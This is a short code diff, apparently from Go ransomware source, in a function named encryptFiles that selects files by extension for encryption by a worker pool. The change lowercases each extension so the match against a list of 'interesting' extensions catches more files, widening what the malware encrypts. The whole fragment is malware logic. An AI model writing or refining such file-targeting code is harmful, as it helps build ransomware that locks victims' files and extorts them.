@@ -119,7 +119,7 @@ func encryptFiles() {
 				ext := filepath.Ext(path)
 				if ext != "" {
 					// Matching extensions
-					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
+					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
 						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
 
 						// Each file is processed by a free worker on the pool, so, for each file
